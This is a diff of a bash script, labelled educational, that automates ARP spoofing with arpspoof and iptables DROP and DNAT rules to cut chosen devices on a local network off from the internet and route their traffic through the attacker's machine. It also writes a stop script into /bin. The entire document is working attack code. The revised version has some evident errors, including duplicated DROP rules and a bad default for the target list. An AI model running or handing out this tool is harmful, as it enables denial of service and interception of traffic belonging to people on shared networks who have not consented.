@@ -1,78 +1,71 @@
-#!/usr/bin/env bash
-set -e
+#!/bin/bash
 
 # ARP Spoofing Internet Blocker (Educational Purposes Only)
 # Requires: arpspoof, iptables, and root privileges
 
 # Detect Interface
 WLAN=$(ip link show | awk -F': ' '/^[0-9]+: wl/{print $2}' | head -n 1)
-echo "Enter Wireless Interface (press Enter for default: $WLAN):"
-read -p "> " WLN
+echo "Enter Wireless Interface: Enter by default"
+read -p "> $WLAN " WLN
 INTERFACE="${WLN:-$WLAN}"
 
 # Detect Gateway IP
 GW=$(ip route show dev "$INTERFACE" | awk '/default/ {print $3}')
-echo "Enter Router Gateway IP (press Enter for default: $GW):"
-read -p "> " INET
+echo "Enter Router Gateway IP: Enter by default"
+read -p "> $GW" INET
 GATEWAY="${INET:-$GW}"
 
-# Detect Device IP
-IP=$(ip addr show "$INTERFACE" | awk '/inet / {print $2}' | cut -d/ -f1)
-echo "Enter Device IP (press Enter for default: $IP):"
-read -p "> " DEVIP
-MYIP="${DEVIP:-$IP}"
-
-# Get Target IPs (no default, must specify)
-echo "Enter one or more target IPs (space-separated, e.g. 192.168.1.110 192.168.1.111):"
+# Detect Subnet
+MASK=$(ip addr show "$INTERFACE" | grep 'inet ' | awk '{print $2}')
+echo "Enter multiple target: e.g 192.168.1.110 192.168.1.111"
 read -p "> " IPS
-if [[ -z "$IPS" ]]; then
-  echo "No target IPs entered. Exiting."
-  exit 1
-fi
-TARGET_IPS="$IPS"
+TARGET_IPS="${IPS:-$MASK}"
+
+# Detect Device IP
+echo "Enter Device IP: Enter by default"
+IP=$(ip addr show "$INTERFACE" | awk '/inet / {print $2}' | cut -d/ -f1)
+read -p "> $IP" DEVIP
+MYIP="${DEVIP:-$IP}"
 
 echo ""
 # Prompt configuration
 echo "Your Arpspoof Configurations..."
 echo ""
-echo "INTERFACE: | $INTERFACE"
-echo "GATEWAY:   | $GATEWAY"
-echo "MYIP:      | $MYIP"
-echo "TARGETS:   | $TARGET_IPS"
+echo "|INTERFACE: | $INTERFACE"
+echo "|GATEWAY:   | $GATEWAY"
+echo "|MYIP:      | $MYIP"
+echo "|TARGETS:   | $TARGET_IPS"
 
 # Enable IP Forwarding
 echo 1 > /proc/sys/net/ipv4/ip_forward
 
 # Flush Iptables existing rules
-iptables -F
-iptables -X
 iptables -t nat -F
-iptables -t filter -F FORWARD
+iptables -F FORWARD
 
-# Remove Iptables rules (stopper script)
-STOP_SCRIPT="/usr/local/bin/netkiller-stop"
-cat > "$STOP_SCRIPT" << EOF
-#!/usr/bin/env bash
-iptables -F
-iptables -X
+# Remove Iptables rules
+cat > /bin/netkiller-stop << EOF
+#!/bin/sh
+
 iptables -t nat -F
-iptables -t filter -F FORWARD
+iptables -F FORWARD
 pkill arpspoof
 echo "Restoring the Connections..."
 EOF
-chmod 755 "$STOP_SCRIPT"
+chmod 755 /bin/netkiller-stop
 
 for TARGET in $TARGET_IPS; do
+       # Block all traffic of the target wifi clients
     (
-        # Block target ip traffic
         iptables -I FORWARD -s "$TARGET" -d "$GATEWAY" -j DROP
-        iptables -I FORWARD -s "$GATEWAY" -d "$TARGET" -j DROP
-
-        # Bidirectional Arp Spoofing
+        iptables -I FORWARD -d "$GATEWAY" -s "$TARGET"  -j DROP
+        iptables -t nat -A PREROUTING -s "$TARGET" -j DNAT --to-destination "$GATEWAY"
+      
+      # Bidirectional Arp Spoofing
         arpspoof -i "$INTERFACE" -t "$TARGET" "$GATEWAY" >/dev/null 2>&1 &
         arpspoof -i "$INTERFACE" -t "$GATEWAY" "$TARGET" >/dev/null 2>&1 &
     ) &
 done
 
-echo "Attack is running in the background...!!!"
+echo "Attacks is running in the background...!!!"
 echo "To stop, Run: sudo netkiller-stop"
